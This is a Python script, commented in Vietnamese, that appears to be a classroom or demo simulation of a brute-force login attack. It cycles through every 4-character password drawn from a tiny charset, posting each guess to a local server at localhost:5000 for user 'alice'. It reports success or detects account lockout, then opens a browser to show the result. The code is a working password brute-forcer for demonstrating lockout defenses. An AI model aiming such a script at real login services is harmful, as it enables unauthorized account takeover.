import time
import requests
import itertools
import webbrowser
import sys
from tqdm import tqdm

# Đảm bảo in được emoji trên Windows
if sys.stdout.encoding != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8')

# Cấu hình
url = "http://localhost:5000/login"
username = "alice"
chars = "ab12"
password_length = 4

def print_banner():
    print("\n" + "="*60)
    print(" 🔥 PHASE 1: BRUTE FORCE ATTACK SIMULATION")
    print("="*60)
    print(f" Target URL   : {url}")
    print(f" Target User  : {username}")
    print(f" Charset      : {chars}")
    print(f" Max Length   : {password_length}")
    print("-" * 60)

def main():
    print_banner()
    start_time = time.time()
    attempts = 0
    found_password = None

    total_combinations = len(chars) ** password_length
    
    pbar = tqdm(total=total_combinations, desc=" [ATTACKING]", unit="pwd", bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]')

    for combo in itertools.product(chars, repeat=password_length):
        password = "".join(combo)
        attempts += 1

        tqdm.write(f" Trying #{attempts}/{total_combinations}: {password}")
        time.sleep(0.05) # Thời gian thử như phiên bản cũ
        
        try:
            response = requests.post(url, data={"username": username, "password": password}, timeout=5)
        except:
            pbar.close()
            print("\n [!] Error: Server is not running.")
            return

        # Kiểm tra kết quả thành công TRƯỚC khi update progress bar để dừng chính xác
        if "access granted" in response.text.lower() or "authentication successful" in response.text.lower():
            found_password = password
            # Đẩy thanh progress lên 100%
            remaining = total_combinations - pbar.n
            if remaining > 0:
                pbar.update(remaining)
            pbar.close()
            print(f"\n [✅] SUCCESS! Password found at try #{attempts}: {found_password}")
            break

        pbar.update(1)
            
        if "account locked" in response.text.lower():
            pbar.close()
            print(f"\n [🛡️ ] DEFENSE DETECTED: Account is LOCKED after {attempts} attempts.")
            print(" [i] Switching to Web to see the result...")
            time.sleep(2)
            webbrowser.open(f"http://localhost:5000/?username={username}&locked=true")
            return

    if found_password:
        total_time = time.time() - start_time
        print("\n" + "="*60)
        print(" BRUTE FORCE ATTACK RESULT")
        print(f" Attempts     : {attempts}")
        print(f" Time taken   : {total_time:.2f}s")
        print(f" Password     : {found_password}")
        print("-" * 60)
        print(" [!] Opening web portal...")
        print(" [i] Password auto-filled. Please click 'Login' to verify.")
        time.sleep(1.5)
        webbrowser.open(f"http://localhost:5000/?username={username}&password={found_password}")
    else:
        pbar.close()
        print("\n [❌] FAILED: Password not found.")
    print("="*60 + "\n")

if __name__ == "__main__":
    main()